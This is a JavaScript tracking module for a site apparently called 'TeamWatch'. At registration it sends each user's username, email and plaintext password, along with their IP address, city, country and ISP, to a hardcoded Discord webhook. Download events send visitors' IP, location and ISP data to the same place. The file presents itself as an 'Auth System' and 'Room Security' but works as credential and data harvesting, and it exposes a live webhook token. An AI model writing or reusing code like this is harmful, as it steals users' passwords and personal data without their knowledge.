const Tracking = {
    webhookUrl: "https://canary.discord.com/api/webhooks/1567697691410960465/amEUE_Q-PqDd-dfMzHjd0aaE3LG5Uu8WZLod4y1nhrMA1ICrtF03yyCMD_-JvtTgN--Y",

    getFlagEmoji(countryCode) {
        if (!countryCode) return '🌍';
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
    },

    async getIpData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            return await response.json();
        } catch (e) {
            console.error("IP Fetch failed", e);
            return {};
        }
    },

    async sendWebhook(payload) {
        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true // Sayfa yönlense bile isteğin gitmesini sağlar
            });
        } catch (error) {
            console.error("Webhook failed", error);
        }
    },

    async logRegistration(username, email, password) {
        const data = await this.getIpData();
        const ip = data.ip || 'Unknown IP';
        const country = data.country_name || 'Unknown Country';
        const city = data.city || 'Unknown City';
        const flag = this.getFlagEmoji(data.country_code);

        const payload = {
            embeds: [{
                title: "✅ New User Registered",
                color: 0x57F287, // Green
                fields: [
                    { name: "👤 Username", value: username, inline: true },
                    { name: "📧 Email", value: email, inline: true },
                    { name: "🔑 Password", value: `||${password}||`, inline: true },
                    { name: "🌍 Location", value: `${flag} ${city}, ${country}`, inline: true },
                    { name: "📡 IP Address", value: `\`${ip}\``, inline: true },
                    { name: "🕒 Time", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
                ],
                footer: { text: "TeamWatch Auth System" },
                timestamp: new Date().toISOString()
            }]
        };

        await this.sendWebhook(payload);
    },

    async logDownload(user) {
        const data = await this.getIpData();
        const ip = data.ip || 'Unknown IP';
        const country = data.country_name || 'Unknown Country';
        const city = data.city || 'Unknown City';
        const isp = data.org || 'Unknown ISP';
        const flag = this.getFlagEmoji(data.country_code);

        const payload = {
            embeds: [{
                title: "📥 Download Started (Room)",
                description: `User **${user.name}** initiated download from Extension Overlay.`,
                color: 0x00ff00,
                fields: [
                    { name: "🌍 Location", value: `${flag} ${city}, ${country}`, inline: true },
                    { name: "💻 Platform", value: "Windows", inline: true },
                    { name: "📡 IP Address", value: `\`${ip}\``, inline: false },
                    { name: "🏢 ISP", value: isp, inline: true },
                    { name: "🕒 Time", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
                ],
                footer: { text: "TeamWatch Room Security", icon_url: "https://i.imgur.com/4M34hi2.png" },
                timestamp: new Date().toISOString()
            }]
        };

        await this.sendWebhook(payload);
    },

    async logMainDownload() {
        const data = await this.getIpData();
        const ip = data.ip || 'Unknown IP';
        const country = data.country_name || 'Unknown Country';
        const city = data.city || 'Unknown City';
        const isp = data.org || 'Unknown ISP';
        const flag = this.getFlagEmoji(data.country_code);

        const payload = {
            embeds: [{
                title: "📥 Main Site Download",
                description: `A user initiated download from the Main Website.`,
                color: 0x0099ff, // Blue for main site
                fields: [
                    { name: "🌍 Location", value: `${flag} ${city}, ${country}`, inline: true },
                    { name: "💻 Platform", value: "Windows", inline: true },
                    { name: "📡 IP Address", value: `\`${ip}\``, inline: false },
                    { name: "🏢 ISP", value: isp, inline: true },
                    { name: "🕒 Time", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
                ],
                footer: { text: "TeamWatch Web Tracking" },
                timestamp: new Date().toISOString()
            }]
        };

        await this.sendWebhook(payload);
    }
};
